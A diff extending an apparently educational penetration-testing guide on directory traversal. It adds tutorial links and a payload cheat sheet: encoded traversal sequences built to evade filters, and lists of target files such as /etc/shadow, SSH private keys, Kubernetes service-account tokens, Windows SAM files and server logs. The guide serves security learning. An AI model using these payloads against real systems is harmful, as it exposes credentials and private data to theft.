@@ -34,6 +34,123 @@ e. Regular Patching and Updates: Keep all software components, including web ser
 Directory traversal vulnerabilities pose a significant threat to the security of web applications. By understanding the fundamentals of directory traversal, ethical hackers and penetration testers can effectively identify and exploit these vulnerabilities, helping organizations secure their systems. Employing a combination of manual testing techniques, automated scanning tools, and implementing robust security measures can mitigate the risks associated with directory traversal and safeguard sensitive data from unauthorized access or compromise.
 
 ### Tutorials on Directory Transversal
-
+- [What is directory transversal](https://learn.snyk.io/lesson/directory-traversal/) - A good article by Synk introducing the subject
+- [What is directory transversal and how to prevent it](https://portswigger.net/web-security/file-path-traversal) - A good article on directory transversal and how to mitigate it
+- [Directory Transversal (Path transversal)](https://www.invicti.com/learn/directory-traversal-path-traversal/) - A good article by AppSec
+- [Directory Transversal Tutorial](https://community.veracode.com/s/videotutorial/directory-traversal-tutorial-MCMEQRWCYPAFAHBAKRE7HHSQFAAY)- a good overview by Veracode
 
 ### Payloads for Directory Transversal
+```
+../
+..\
+..\/
+%2e%2e%2f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+
+```
+
+16 bits Unicode
+
+```
+. = %u002e
+/ = %u2215
+\ = %u2216
+
+```
+UTF-8 Unicode encoding
+```
+. = %c0%2e, %e0%40%ae, %c0ae
+/ = %c0%af, %e0%80%af, %c0%2f
+\ = %c0%5c, %c0%80%5c
+
+```
+
+Double URL Encoding
+```
+. = %252e
+/ = %252f
+\ = %255c
+
+```
+
+Interesting Linux Files
+```
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/sched_debug
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/self/cwd/index.php
+/proc/self/cwd/main.py
+/home/$USER/.bash_history
+/home/$USER/.ssh/id_rsa
+/run/secrets/kubernetes.io/serviceaccount/token
+/run/secrets/kubernetes.io/serviceaccount/namespace
+/run/secrets/kubernetes.io/serviceaccount/certificate
+/var/run/secrets/kubernetes.io/serviceaccount
+/var/lib/mlocate/mlocate.db
+/var/lib/mlocate.db
+
+```
+
+Interesting Windows Files
+```
+c:\windows\system32\license.rtf
+c:\windows\system32\eula.txt
+
+```
+Other Windows Files to check
+```
+c:/boot.ini
+c:/inetpub/logs/logfiles
+c:/inetpub/wwwroot/global.asa
+c:/inetpub/wwwroot/index.asp
+c:/inetpub/wwwroot/web.config
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system32/inetsrv/metabase.xml
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system volume information/wpsettings.dat
+c:/system32/inetsrv/metabase.xml
+c:/unattend.txt
+c:/unattend.xml
+c:/unattended.txt
+c:/unattended.xml
+c:/windows/repair/sam
+c:/windows/repair/system
+
+```
+Check the following log files
+```
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
+
+```
